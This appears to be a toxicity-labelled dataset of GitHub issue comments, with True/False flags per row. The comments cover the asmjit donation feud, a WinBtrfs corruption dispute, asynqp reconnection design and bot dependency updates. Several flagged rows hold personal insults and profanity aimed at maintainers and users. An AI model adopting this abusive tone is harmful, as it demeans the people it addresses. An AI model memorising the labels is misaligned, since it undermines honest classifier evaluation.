anaconda-issues/ContinuumIO/5353/256721291,Main error Application &lt;b&gt;spyder&lt;/b&gt; launch may have produced errors. Traceback System information ,False,True,False,anaconda-issues/ContinuumIO/5353
anaconda-issues/ContinuumIO/5353/328546814,See Issue #1778 for more information on how to fix this.  Closing as duplicate of #1778  Please remember to update to the latest version of Navigator to include the latest fixes. Open a terminal (on Linux or Mac) or the Anaconda Command Prompt (on windows) and type ,False,True,False,anaconda-issues/ContinuumIO/5353
android/cSploit/931/285884059,"The whole app is just a mockup, I've been spending the night reviewing the code and it seems like a donkey (or is it a monkey) wrote that, thanks for an ever failling, condescending app that will never reach the stage of even being in beta. Peace ",True,True,False,android/cSploit/931
android/cSploit/931/355209488,@friend long as your name indicates that you are 15years old and the csploit you forked has no code from you i cant take you seriously. Fuck off troll ,True,True,False,android/cSploit/931
asmjit/asmjit/231/400907717,"I do not recommend donating to this project, we have donated a few times to them and now they have removed information about it. Our money wasn't good back then Petr when nobody supported your project? ",True,True,False,asmjit/asmjit/231
angular-basics/kianaditya/64/429081702,"Bumps jasmine-core from 2.99.1 to 3.4.0. &lt;details&gt; &lt;summary&gt;Release notes&lt;/summary&gt;  *Sourced from [jasmine-core's releases]( []( Fix links in 3.4 release notes - []( Bump version to 3.4 - []( No  in the suite - []( Handle WebSocket events in IE when detecting Errors - []( Allow excluded specs in CI without breaking the output - []( Merge branch 'wood1986-fix/npm-audit-dependencies-and-fast-glob-only-failed-t... - []( Consolidate some dev dependencies and use more maintained versions - []( Make node execution default and override for browsers - []( Fix sauce status codes and try travis built-in node support - []( Use the correct env var from travis for tunnels - Additional commits viewable in [compare view]( /&gt;  [![Dependabot compatibility score]( will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting .  [//] # (dependabot-automerge-start) [//] # (dependabot-automerge-end)  ---  &lt;details&gt; &lt;summary&gt;Dependabot commands and options&lt;/summary&gt; &lt;br /&gt;  You can trigger Dependabot actions by commenting on this PR -  will rebase this PR -  will recreate this PR, overwriting any edits that have been made to it -  will merge this PR after your CI passes on it -  will squash and merge this PR after your CI passes on it -  will cancel a previously requested merge and block automerging -  will reopen this PR if it is closed -  will close this PR and stop Dependabot creating any more for this minor/major version (unless you reopen the PR or upgrade to it yourself) -  will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself) -  will set the current labels as the default for future PRs for this repo and language -  will set the current reviewers as the default for future PRs for this repo and language -  will set the current assignees as the default for future PRs for this repo and language -  will set the current milestone as the default for future PRs for this repo and language -  will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme  Additionally, you can set the following in your Dependabot [dashboard]( Update frequency (including time of day and day of week) - Automerge options (never/patch/minor, and dev/runtime dependencies) - Pull request limits (per update run and/or open at any time) - Out-of-range updates (receive only lockfile updates, if desired) - Security updates (receive only security updates, if desired)  Finally, you can contact us by mentioning @friend.  &lt;/details&gt;",False,True,False,angular-basics/kianaditya/64
asmjit/asmjit/231/455801270,Why the sudden change of heart? ,False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455801897,Cheap shot dude... ,False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455802483,"I tried to solve this privately instead of making it a community thing as this was rather personal, however, the communication didn't end up well. The sudden change was of course not meant positively. I think that in any way we should stay civilized here and don't let misunderstanding or anger change how we react or behave to each other. ",False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455809071,Read above. ,False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455809482,I think sharing the whole communication would be more transparent since you already started this nonsense. ,False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455810232,"Sure thing, here you go, after I made a donation I sent you the link to my site How's that a paid ad, when you wanted to put it yourself as a thank you for the first donation? Don't you even feel bad, accusing me of something that didn't even happen? In 2016 I wanted to advertise in AsmTK project for 150 EUR, but you refused (you didn't want to make this kind of affiliation with me, whatever that means), that was the only case I wanted to pay for a link. ",False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455810434,"I thought I didn't remember the facts correctly in our recent emails, but the good thing I had it all saved and I don't feel guilty, because at first I thought I have paid for the link in AsmJit project, but now we all can see you came with that yourself. ",False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455814689,"I never paid for any advertisement, I thought I did because you said so in the recent emails and it was 9 years ago, but as we all can see you came up with this idea first. If you are so stubborn to NOT include my name on your donors list, even if I supported your project from day one, just because you are angry that I showed you were wrong and donations didn't have any strings attached, it's just another reason to not make any donations to you or any of your projects, because you are dishonest person and you have your supporters for nothing. ",True,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455814932,Maybe linking  would help others understand why I have refused your donations after 2016 and why I think this couldn't end up differently. ,False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455813552,"For documentary purposes I'm attaching the whole communication here, because I think it's important for understanding the context. I thought about handling this differently, but I have a weird feeling that it ended like this in all alternative universes. I would also like to say ""sorry"" to the community. In my opinion this issue should have never been opened and the community of open source project should not be used as a jury in a personal dispute between 2 people. My proposal of fixing this is simple. Since I don't have the information to transfer the donated money back (no more PayPal), I would like to donate the same amount in BTC to some other open-source project on behalf of PELock. I thought about x64dbg as they seem to have a good relation with Bartosz and accept crypto. [So here is the communication] I don't think a comment under a commit is a proper way of establishing communication between us about something like this. I don't think making such communication public makes sense as nobody can verify what happened anyway, so what did you try to accomplish? I already calculated it (below) and just wanted to verify the final amount with you. I never said you haven't donated or miscounted the number of donations, so please let's not turn this into something it isn't. I'm not trying to play any card here. I'm trying to make us even in a polite way so we both can move on without a feeling that one owes something to the other. Remember that it was you who started this publicly. So if this stays public then I would like to disclose the amount as i think it's very important considering what you wrote in that issue. So as a result I want to return you what you have invested, because I disagree with your methods and the way you started dealing with it. You have no information about the number of donations that I have received nor their amounts, so please stop these speculations. For your own information - donations are symbolic to me - they are nice and I'm glad when somebody appreciates my work, but it's more about the appreciation than finance to me. I would not be working on asmjit or other open source projects if I wanted to make more money. I love sharing my work and I don't demand anything in return. After all of this I don't want to keep the money and that's what I'm trying to tell you. I don't even insist on sharing any details of the issue publicly if we can just resolve it quickly and quietly without further escalation. For me this is not worth it, it doesn't move the project anywhere, and it distracts me from other work that I wanna do. So please let's do the right thing to finally resolve this so we can move on. [[Reply - PELock]] Hello Petr, Is anything from this list false?  I have donated 3 times without requesting anything in return I have donated one time for the link (2nd donation) Fine, you could remove the link, I agree with that So why do you keep the donations list if I'm not there (just a name)? You don't want the money but you gladly accepted it back then  It just seems you're not very decent and honest person. I have supported many, many reversing and programming projects and this is the first time someone doesn't want to mention the donor just because he has the money now. This is another definition of low level. [[Reply - Petr]] I'm kindly asking you to read again what I have written. I believe the outcome would be different if we started the whole thing differently, but now it's too late to do that, because I just don't like where this went and I don't want to make it worse. I would really appreciate if you send me the IBAN so we can finally resolve this and move on. I'm asking you like third time and you keep only adding more stuff that I'm not interested in. I really don't understand why you make such a drama out of it. We have different opinions and that's it, life goes on, no need to judge others and complicate it. [[Reply - PELock]] Hello Petr, And I don't understand why is it so big problem for you to leave donors names on your page (I'm not asking for the link), does it hurt your feelings or what? Are you ashamed to take donations? If so and you want to be true to yourself you should remove this sections completely, because you don't even know how to handle it properly. I want you to keep the money and think how dishonest your actions are. You deserved donations back then, if I knew how vile person you are I wouldn't donate a cent to you. Please don't write to me again. ",True,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455815708,"Do you want to say you were offended by the reported bugs too, that could be fixed with changing 1 function to another to keep your software backward compatible (what a terrible idea to keep your software backward compatible, I know)? It's getting better and better. ",False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455825290,"Dude's a troll. I've got PayPal, assuming that 125 euro is the amount, I'd be happy to send it to him for you. On Jan 19, 2019 415 PM, Bartosz Wójcik notifications@friend.com wroteDo you want to say you were offended by the reported bugs too, that could be fixed with changing 1 function to another to keep your software backward compatible (what a terrible idea to keep your software backward compatible, I know)? It's getting better and better. —You are receiving this because you are subscribed to this thread.Reply to this email directly, view it on GitHub, or mute the thread. ",False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/455827811,"Can't argue with the facts that's why you call me names? Send it to the animal shelter if you have spare money and don't be a douche (again). I never said I want it back, can't you read? ",False,True,False,asmjit/asmjit/231
asmjit/asmjit/231/457874895,Unpinning and locking the issue. I think 7 days of attention was enough and arguing didn't make sense. ,False,True,False,asmjit/asmjit/231
asynqp/benjamin-hodgson/15/100887823,"I think there are a few related issues here  When a TCP connection unexpectedly drops, there's no exception to notify application code of the error. When the TCP connection has dropped, you can't manually  a connection. When the TCP connection has dropped, you can't manually  a channel. When the TCP connection has dropped, you can't unsubscribe existing consumers.  Regarding point 1. Error handling in async code is generally quite complicated (where should the exception go if all your application code is currently idle?).  approaches the issue by allowing you to register an exception handler with the event loop - so in theory all  needs to do is raise an appropriate exception when the connection is lost, and then you can use the loop's exception handler to build any application-specific retry logic. I happen to know that the transport calls  when the socket dies. It looks like our  doesn't override that method. I think all it needs to do is  - I'll accept a pull request (with tests) which addresses that (I may get some time to work on it tomorrow but I can't make any promises). Points 2-4 seem related to me (though I split them up because they may require separate fixes). Thinking out loud - I guess that those three methods try to send a frame over the wire to the server, which blocks forever because the socket is dead. I suppose one option would be to throw an exception when you try to send data through the protocol if the connection has been lost, and do some sort of ""emergency shut-down"" of any live objects or tasks which assume the connection is still open. In general, 's error handling capabilities have room for improvement. Thanks very much for raising the issue smiley Sorry for the guesswork-filled reply, my brain has not been in AMQP mode for a while so the neural pathways have crusted up a bit wink ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/101108762,"I took a quick look through the code, and have a few thoughts I figured I'd bounce off of you. 1) I think raising a custom error and allowing the client to install a base error handler to handle a reconnection is the right approach. It seems to me that there are two places that should raise this error. The  method as you mentioned, but also inside 2) Things seem to block waiting on responses from the server inside of . It seems reasonable that if a connection is closed, there's no point in awaiting on anything so an exception should be set inside each future in each Syncroniser. The problem is that each connection needs to know about each Syncroniser in use in order to do that. I haven't totally digested how it's broken up, but I think the intial connection will have it's own Syncroniser, then each channel, and again each queue. I'm guessing that we would store a list inside each protocol instance and pass a reference to each channel/queue so that they can register any Syncronisers created with the connection. Then, when the heartbeats time out, or the connection_lost callback is triggered a set_exceptions method is called on each registered sycnroniser for that protocol instance(connection). Then each function that could be awaiting will have to look for the exception and handle it appropriately. I'd be happy to try to put together a pull request with tests, but I want to get your take on how things should be done before I get too far into it. ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/101526797,"I missed the . Since it's in communication with the Syncroniser already, a poison pill sounds like a much better approach than collecting references to the Syncronisers directly. I'm a bit busy with work just now to work on either, but I'd like to help. Depending how things go I may have a chance to look at this next week. ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/101220832,"I agree with what you say in point 1. Regarding point 2, a little extra architectural knowledge off the top of my head might help. Each channel (including the connection, which is defined by AMQP to be channel 0) is essentially an actor with an inbox of frames from the server. The channel autonomously pulls frames out of the inbox and processes them using the correct method in the . The  is basically the entry point for a channel to process a frame. The inbox is implemented as a  - there is one queue per open channel; these are managed by the . So when a frame arrives, the  tells the  to put the frame in the queue of the correct channel. The  is basically an implementation detail of the handler; it keeps track of which objects on a channel are waiting for which frames and notifies them when a frame arrives. It mediates between API classes such as  and the objects which respond to the server (the s). So given all that, I think that error handling should respect the current architecture and go via the  and the . I think the right way to go is to add a special type of message which shuts down the actor (this is usually called a ""poison pill"") and a corresponding method on the  to respond to it. I guess this method would tell its  to kill all of its currently-live . The downside of this approach is that the poison pill message has to wait in the inbox until everything before it in the queue has been processed, which could cause problems if those messages block or if  never gets called - though I don't think that'll be too much of an issue in practice. That sounds like quite a lot of work to me. If you want to submit a pull request for part 1 (raising exceptions from the  when the connection dies) and leave part 2 (the poison pill message) to me then I'm fine with that. But if you fancy a challenge then I'll be very happy to accept a contribution for each of them! ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/103807153,"I submitted two pull requests today. The first contains the asynqp to the code and tests, the second contains an example program that automatically reconnects. ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/103820444,"Meh, failed flake8, those pesky empty spaces on blank lines. I'll fix and submit new merge requests ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/103882436,"Yup, builds passing now. ",False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/107268457,Closed by #19 ,False,True,False,asynqp/benjamin-hodgson/15
asynqp/benjamin-hodgson/15/74938994,"I've been playing with asynqp a little bit, and I'm really liking it. I'm trying to figure out how to handle reconnecting in the case of a lost connection. With a producer I get the following output on the console, but I don't seem to be able to capture it in the loop error handler. socket.send() raised exception  With a consumer, no exception and no error are raised. I tried creating an async task that would simply try to open a new channel with a timeout. If the timeout exception is raised, I assume the connection is down then try to restart a new connection. The problem in this case is that I can't seem to stop the old consuming task. Calling the .close() method on the connection or channel blocks forever when the connection is down, as does a call to .cancel() on the consumer. Do you have any thoughts on how a lost connection can be detected, and consumers rebooted with the new connection? Thanks for all the work you are doing on this. ",False,True,False,asynqp/benjamin-hodgson/15
babel/babel/8432/348466385,SOURCE CODE GENERATED CODE WHAT IS WRONG WITH YOU PEOPLE? DO YOU EVER WRITE DOCUMENTATION FOR YOUR CODE? THIS IS UTTERLY RIDICULOUS. ,True,True,False,babel/babel/8432
babel/babel/8432/411183013,"Hey @friend! We really appreciate you taking the time to report an issue. The collaborators on this project attempt to help as many people as possible, but we're a limited number of volunteers, so it's possible this won't be addressed swiftly. If you need any help, or just have general Babel or JavaScript questions, we have a vibrant Slack community that typically always has someone willing to help. You can sign-up here for an invite. ",False,True,False,babel/babel/8432
babel/babel/8432/411184222,Please fill our issue template so that we can actually help you. Feel free to open a new issue. ,False,True,False,babel/babel/8432
babel-plugin-transform-currency-operators/scurker/6/276775833,"Version 0.52.0 of rollup was just published. &lt;table&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Dependency     &lt;/td&gt;     &lt;td&gt;       rollup     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Current Version     &lt;/td&gt;     &lt;td&gt;       0.51.8     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Type     &lt;/td&gt;     &lt;td&gt;       devDependency     &lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt;The version 0.52.0 is not covered by your current version range. If you don’t accept this pull request, your project will work just like it did before. However, you might be missing out on a bunch of new features, fixes and/or performance improvements from the dependency update. It might be worth looking into these changes and trying to get this project onto the latest version of rollup. If you have a solid test suite and good coverage, a passing build is a strong indicator that you can take advantage of these changes directly by merging the proposed change into your project. If the build fails or you don’t have such unconditional trust in your tests, this branch is a great starting point for you to work on the update.  &lt;details&gt; &lt;summary&gt;Commits&lt;/summary&gt; &lt;p&gt;The new version differs by 29 commits.&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;0.52.0&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Update changelog&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge branch 'release-0.52'&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge pull request #1761 from rollup/test-error-from-promise&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge pull request #1688 from tcoopman/master&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge pull request #1760 from rollup/more-treeshaking-options&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;* Test rejections from Promise based plugins are displayed&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge pull request #1745 from btd/master&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;* Move pureExternalModules -&gt; treeshake.pureExternalModules and make it&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;* Update options format used in test configs&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;* Add option to disable property access checks&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;* Only check access for member expression properties for now&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge pull request #1731 from ankeetmaini/promiseable-config&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Merge pull request #1696 from bigtimebuddy/master&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Update Bundle.js&lt;/code&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;There are 29 commits in total.&lt;/p&gt; &lt;p&gt;See the &lt;a href="" diff&lt;/a&gt;&lt;/p&gt; &lt;/details&gt;&lt;details&gt;   &lt;summary&gt;FAQ and help&lt;/summary&gt;    There is a collection of [frequently asked questions]( If those don’t help, you can always [ask the humans behind Greenkeeper]( Greenkeeper bot palm_tree ",False,True,False,babel-plugin-transform-currency-operators/scurker/6
babel/babel/8432/411184713,Rude issues aren't the way to get help. Please follow the code of conduct. ,False,True,False,babel/babel/8432
babel/babel/8432/411191284,"I legitimately can't tell what issue you're running into from this code sample. With the plugins you've listed and the input code, the example generated code is not what Babel produces, since there is a  variable that does not exist in the input, and otherwise looks like what I'd expect. You have not stated what about it is different from what you expected, and we are not psychic. You're clearly frustrated, but if your goal is just to vent at us and not have a useful discussion, you are not welcome on this project. ",False,True,False,babel/babel/8432
ballerina-lang/ballerina-platform/911/202377319,It looks like a connector that is not in package is not handled correctly. The action invocation gives a syntax error. Sample Error ,False,True,False,ballerina-lang/ballerina-platform/911
bedtools2/arq5x/572/259924080,"On this type bed file, where overlapping features have to be merged this command Creates a wrong formatted bed file where in the fourth column is the STRAND and not the NAME of the feature. This Instead of this I observed the bug on the 2.26 and 2.25. 2.24 and 2.23 are doing right. ",False,True,False,bedtools2/arq5x/572
bedtools2/arq5x/572/331759110,Thanks for reporting this.  I just pushed a fix to the repo. ,False,True,False,bedtools2/arq5x/572
bety/PecanProject/568/292490245,"To deploy this, you will need to  Create  (as usual). Copy  to . Define the environment variable .  (For running under Apache http server, I did this by adding a directive of the form  inside the  block for the app.  You can generate a secret key by running .  Alternatively, for testing purposes, you can just edit  and replace  with some hard-coded value.) ",False,True,False,bety/PecanProject/568
bety/PecanProject/568/361321224,Testers should  Test any anomalous behavior against the latest released version of BETYdb Make a note here if the anomalous behavior shows up in the upgrade version but not in the latest released version. Make a new issue (if no issue already exists) if the anomalous behavior also shows up in the latest released version.  ,False,True,False,bety/PecanProject/568
bety/PecanProject/568/361324886,@friend The RSpec tests pass on my server.  This build problem is connected with issue #552.  I've assigned this to @friend. ,False,True,False,bety/PecanProject/568
bety/PecanProject/568/362055829,@friend this is assigned to you - can you deploy this so it can be tested? ,False,True,False,bety/PecanProject/568
bety/PecanProject/568/362114126,"took an exisiting instance of pecan, switched to this branch, ran set the secret key and now I end up with an error, no log files. Not sure what to do next, I can show it after the TERRA meeting. ",False,True,False,bety/PecanProject/568
bety/PecanProject/568/367556940,"I checked out the website - went through the process of creating new citations, sites, treatments, trait. Everything works as expected - ",False,True,False,bety/PecanProject/568
bety/PecanProject/568/367703362,@friend let us know when you checked the rest api used in terra project. ,False,True,False,bety/PecanProject/568
bety/PecanProject/568/367739209,"I tested the endpoints used in terrautils (sites, experiments, traits, cultivars) and everything looked good with no errors. ",False,True,False,bety/PecanProject/568
bety/PecanProject/568/367790098,"Found one error—the model ""show"" pages, e.g.   Will fix before pulling. ",False,True,False,bety/PecanProject/568
bety/PecanProject/568/367803803,"Also, show pages for inputs and posteriors, e.g.  and   These are all the same problem, though, which is easily fixed. In all cases, the problem is caused by an obsolete function API for limiting the number of associated dbfiles shown to 100.  I can either (1) replace the function call with one that still works in Rails 4.1; (2) eliminate the limit (in the EBI database, no instance of any of these types ever has more the 3 associated dbfiles!); (3) keep the limit (as in (1)), but add a warning that not all associated files are shown in the case that there are ever more than 100 of them. ",False,True,False,bety/PecanProject/568
bety/PecanProject/568/368940250,I went with option 2 (eliminating the 100-item limit) to fix the problem mentioned above. ,False,True,False,bety/PecanProject/568
bitconnectcoin/bitconnectcoin/65/290326012,How can we create a notification or a mass worldwide add to as people to not sell their BCC for 24hrs and then sell at at the price they where payout... This will be a massive project but it can be done... Anyone willing to make this happen? ,False,True,False,bitconnectcoin/bitconnectcoin/65
blackfriday/russross/538/484224944,"Thanks, @friend! ",False,True,False,blackfriday/russross/538
body-parser/expressjs/309/319626212,"As far as I am aware, , , , and  are valid JSON. However, body-parser's JSON parser fails to parse these bodies with the error message Is this by design? Does body-parser only support object and array payloads? I am using the latest version of  and . Code Demonstrating Issue package.json Server source code () (essentially the example in README) Curl invocations to trigger issue ",False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386040596,"Yes, this is by design. Set the  option ( to  to accept them. ",False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386040970,Thanks! Do you think the error message could be changed to be a bit clearer? Or is that infeasible from how  is written? ,False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386041216,Error message is from . ,False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386041919,"Yes, but  works on , , etc. I figured you are doing something special to filter out non-object/array types. ",False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386042432,"We are, but the message it intended to act exactly as if  didn't accept them, so it looks exactly as terse as for example  ",False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386044847,"From my perspective, the error message (understandably) made me think that I had sent malformed JSON. I spent 10 minutes double checking my code, which is using the clunky XMLHttpRequest interface (so a mistake is not out-of-the-question), and also whipped out WireShark to inspect the packets the code was generating, before isolating  as the issue. I personally think it is a misleading error message, as  has consciously decided to reject a perfectly valid JSON string. Anyway, I am just saying this so you understand my perspective, in case you decide to revisit this at some point. I am thankful for this library and the Express ecosystem in general. 😄 ",False,True,False,body-parser/expressjs/309
body-parser/expressjs/309/386059287,"Sure, but all you're doing is arguing with someone who already agrees with you. I didn't write that into the module, I inherited it. I already plan to change that in 2.0, but I can't just suddenly issue a 1.x release in which data that was previously filtered out suddenly was not. This could cause security issues in applications that were relying on the existing filtering. ",False,True,False,body-parser/expressjs/309
btrfs/maharmstone/88/311528891,"I've recently been spending more time in Windows, with my Ubuntu BTRFS install being mounted using the latest release of the driver. When I tried to boot ubuntu, it fails to start the Unity GUI session and returns to the login manager. Seems like too much corruption has accumulated / ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/378871665,,False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/378875083,here are errors from the kernel log ,False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/384939814,"I set the driver to read only. After getting a BSOD, it failed to mount on linux Fixed by ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/440775659,I wonder if this has been fixed because of the recent changes. ,False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/440798437,"Windows 10 supports Btrfs out of the box, just in case ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/440808590,"I think English isn't his first language, which is why that message looks odd. It probably means something completely different to him. ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/440892220,"For what it's worth - which isn't much given that it's over half a year ago - it looks to me like your device is on the blink. The fact you had generation errors in your free space cache implies that your drive is returning outdated data for some sectors. I don't think this was caused by my driver, so I'm going to close the issue. ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/440933440,"It’s an SSD drive which has not otherwise exhibited problems. Normally, I spend all of my time in Linux. However, I was doing some porting work and I was using Windows intensively during a month or two, without booting Linux. I remember receiving BSODs caused by WinBtrfs. I commented on another issue about the BSODs - #87. After I was finished with windows and booted back into Linux, I found the partition completely hosed as described above. Don’t you think that a natural conclusion is that WinBtrfs caused this? ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/441155746,"No, I don't think that. If there were bugs in the checksumming or data-writing code, you'd see errors all over, not just in one or two sectors like your logs suggest. Furthermore, the BSODs are almost certainly a consequence rather than a cause of the corruption, if indeed they're related at all. From what I know about SSDs, they internally relocate sectors when they realize they are bad, which is why it looks okay to you now. I'd still get a new one, though. ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/441176152,"This was just a small fraction of the logs.  The errors indeed were all over the place. WinBtrfs was gradually corrupting my partition. I remember logging into Linux before it got completely hosed and I remember Linux Chrome complaining about a corrupted profile directory. After some more time in Windows, I could not log in into Linux and got stuck at the login screen (the messages above from 8 months ago). The next stage of corruption was the mount failure (7 months ago). When I uninstalled WinBtrfs, no more BSODs, no more corruption. Which one causes the other (BSODs and corruption) is not clear to me as I have zero experience writing FS drivers, but to me it looks that everything is pointing towards WinBtrfs because it was correlated with it being installed. Do you think that all 4 people who experienced WinBtrfs KERNEL_SECURITY_CHECK BSODs in #87 all had malfunctioning drives as well? ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/441327554,"@friend It may be one of the problems already fixed, have you tried with the latest master? ",False,True,False,btrfs/maharmstone/88
btrfs/maharmstone/88/441363967,"As I said above... Issue 87 was a harmless use-after-free on shutdown, and nothing to do with this. I've said my piece, and I can see it was a mistake trying to engage with you, so I'm locking this thread. ",True,True,False,btrfs/maharmstone/88
bud/bloom-lang/232/1428442,"I've only tested , but I added the others because it seemed natural. ",False,True,False,bud/bloom-lang/232
buildbot-infra/buildbot/101/113018530,"Oops, opened on wrong repository. ",False,True,False,buildbot-infra/buildbot/101
bundler/bundler/7037/420968012,"What was the end-user problem that led to this PR? The problem was that we were not printing any deprecation messages for . What was your diagnosis of the problem? My diagnosis was that we are removing  at the same time as deprecating it. Thus, the deprecations never actually show up. What is your fix for the problem, implemented in this PR? My fix is to first deprecate the command on bundler 2, then remove it in bundler 3. Why did you choose this fix out of the possible options? I chose this fix because it's the most sensible approach to this removal. ",False,True,False,bundler/bundler/7037
caniuse/Fyrd/4428/349598366,Supported in Chrome Android since 35 ,False,True,False,caniuse/Fyrd/4428
carpetmod112/gnembon/39/353964679,This is not intended behaviour. The spawn chunks should only unload when disableSpawnChunks is set to true. ,False,True,False,carpetmod112/gnembon/39
caniuse/Fyrd/4428/412191468,"Hey. You can't add new browser versions with PRs and for android browser beyond 4.4.4, only the latest chromium version will be shown so this PR is useless and @friend please close the PR. ",False,True,False,caniuse/Fyrd/4428
ceph/ceph/12105/261989390,"with this fix applied, test_multi.py can now run to completion ",False,True,False,ceph/ceph/12105
cdnjs/cdnjs/8137/223670289,@friend don't need to use this PR template next time. ,False,True,False,cdnjs/cdnjs/8137
cedri/ipb-asi-dam/7/487673388,Issue moved to ipb-asi-dam/cedri-frontend-web #66 via ZenHub ,False,True,False,cedri/ipb-asi-dam/7
ceph/ceph/12105/190767909,"when set on GET requests, curl sends a 'Transfer-encoding chunked' header, but doesn't do the actual encoding to terminate the message Fixes ",False,True,False,ceph/ceph/12105
ceph/ceph/12105/262287573,"Some more background.. We pass the  string to , which curl uses directly in the HTTP request line. The libcurl tutorial states The  option flags the request as a PUT (), but  only overrides the string sent in the request line to GET. Curl thought it was processing a PUT based on this httpreq flag, so it defaulted to chunked transfer encoding. I have a feeling that we should avoid using , and use  and other the method-specific options instead. It looks like  is only needed for  requests. ",False,True,False,ceph/ceph/12105
centreon/centreon/884/97000028," Author Name Quentin Garnier (Quentin Garnier) Original Redmine Issue 4923,  Date 2013-10-09 Original Assignee Sylvestre Ho  Hi, Can use password input for macros. ",False,True,False,centreon/centreon/884
cdnjs/cdnjs/8137/158431628,"PR for #8073  @friend please help me review this pull request, thank you. Checklist for Pull request or lib adding request issue follows the conventions. Note that if you are using a distribution purpose repository/package, please also provide the url and other related info like popularity of the source code repo/package. Profile of the lib  Git repository (required)  website (optional, not the repository) NPM package url (optional) GitHub / Bitbucket popularity (required) Count of stars 36 Count of watchers 25 Count of forks 11   NPM download stats (optional) Downloads in the last day Downloads in the last week Downloads in the last month    Essential checklist  [ ] I'm the author of this library [ ] I would like to add link to the page of this library on CDNJS on website / readme   [ ] This lib was not found on cdnjs repo [ ] No already exist / duplicated issue and PR [ ] The lib has notable popularity [ ] More than 100 [Stars / Watchers / Forks] on [GitHub / Bitbucket] [ ] More than 500 downloads stats per month on npm registry   [ ] Project has public repository on famous online hosting platform (or been hosted on npm)  Auto-update checklist  [x] Has valid tags for each versions (for git auto-update) [x] Auto-update setup [x] Auto-update target/source is valid. [x] Auto-update filemap is correct.  Git commit checklist  [x] The first line of commit message is less then 50 chars, be clean and clear, easy to understand. [ ] The parent of the commit(s) in the PR is not old than 3 days. [x] Pull request is sending from a non-master branch with meaningful name. [x] Separate unrelated changes into different commits. [x] Use rebase to squash/fixup dummy/unnecessary commits into only one commit. [ ] Close corresponding issue in commit message [x] Mention related issue(s), people in commit message, comment.  cc #8073 ",False,True,False,cdnjs/cdnjs/8137
cerberus/NEU-Libraries/692/83736023,"Can you remember the original filename of the file? Was it; Digital Media Commons -  The Shape of Things to Come-JbpCUVRNYqc.mp4 ? Was this error after the first upload page, or after the second? ",False,True,False,cerberus/NEU-Libraries/692
ceph/ceph/12105/263364067,@friend I think that we should keep it simple and the change minimal ,False,True,False,ceph/ceph/12105
